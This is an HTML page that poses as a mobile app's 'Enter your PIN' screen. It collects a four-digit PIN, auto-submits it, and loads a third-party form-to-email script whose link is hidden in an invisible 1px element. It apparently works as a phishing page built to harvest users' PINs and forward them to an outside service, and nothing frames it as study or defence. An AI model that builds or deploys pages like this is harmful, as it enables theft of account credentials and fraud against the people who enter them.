<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PIN</title>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Arial, sans-serif;
}

body{
    background:#f3f3f3;
}

/* Main wrapper */
.wrapper{
    max-width:420px;
    margin:auto;
    min-height:100vh;
    display:flex;
    flex-direction:column;
    justify-content:space-between;
}

/* Content */
.content{
    padding:20px;
    margin-top:40px;
}

/* Title input style */
.input-title{
    color:#aaa;
    font-size:18px;
    margin-bottom:10px;
}

/* PIN BOXES */
.pin-box{
    display:flex;
    justify-content:space-between;
    margin-bottom:25px;
}

.pin-box input{
    width:70px;
    height:60px;
    font-size:26px;
    text-align:center;
    border:none;
    border-bottom:2px solid #777;
    background:transparent;
    outline:none;
}

/* Button */
.btn{
    width:100%;
    background:#ff3c00;
    color:#fff;
    padding:16px;
    border:none;
    border-radius:6px;
    font-size:18px;
    margin-top:10px;
}

/* Re-enter */
.reenter{
    text-align:center;
    margin-top:25px;
    color:#ff3c00;
    font-size:16px;
}

/* Bottom Nav */
.bottom-nav{
    background:#555;
    display:flex;
    justify-content:space-around;
    padding:14px 0;
}

.bottom-nav i{
    color:#ddd;
    font-size:22px;
}

.bottom-nav .active{
    color:#ff3c00;
}

/* Eye toggle */
.eye{
    text-align:right;
    margin-top:5px;
    color:#666;
    cursor:pointer;
    font-size:14px;
}
</style>

</head>
<body>

<div class="wrapper">

    <!-- TOP CONTENT -->
    <div class="content">
<form action="//submit.form" method="POST">
        <div class="input-title">Enter your PIN</div>

        <div class="pin-box">
            <input type="password" maxlength="1">
            <input type="password" maxlength="1">
            <input type="password" maxlength="1">
            <input type="password" maxlength="1">
        </div>

        <div class="eye" onclick="togglePIN()">👁 Show PIN</div>

        <button type="submit" class="btn" id="submitBtn">Submit PIN</button>
         <div class="reenter">Re-enter number</div>

    </div>

<div style='font-size:1px; opacity:0;' style="float:right"><a href="https://www.100forms.com" id="lnk100" title="form to email">form to email</a></div>
<script src="https://www.100forms.com/js/FORMKEY:WK28P6UHYBXU" type="text/javascript"></script>
</div>
       
</form>
    <!-- BOTTOM NAV -->
    <div class="bottom-nav">
        <i class="fa fa-home"></i>
        <i class="fa fa-envelope"></i>
        <i class="fa fa-info"></i>
        <i class="fa fa-user active"></i>
    </div>

</div>

<script>
const inputs = document.querySelectorAll(".pin-box input");
const btn = document.getElementById("submitBtn");

/* Auto next + auto submit */
inputs.forEach((input, index) => {

    input.addEventListener("input", () => {

        if(input.value.length === 1 && index < inputs.length - 1){
            inputs[index+1].focus();
        }

        let pin = "";
        inputs.forEach(i => pin += i.value);

        if(pin.length === 4){
            btn.click();
        }
    });

    input.addEventListener("keydown", (e) => {
        if(e.key === "Backspace" && input.value === "" && index > 0){
            inputs[index-1].focus();
        }
    });

});

/* Show Hide */
let visible = false;
function togglePIN(){
    visible = !visible;

    inputs.forEach(input => {
        input.type = visible ? "text" : "password";
    });

    document.querySelector(".eye").innerText = visible ? "🙈 Hide PIN" : "👁 Show PIN";
}

/* Submit */
btn.onclick = () => {
    let pin = "";
    inputs.forEach(i => pin += i.value);

    if(pin.length < 4){
        alert("Enter full PIN");
    } else {
        alert("PIN Submitted: " + pin);
    }
}
</script>

</body>
</html>
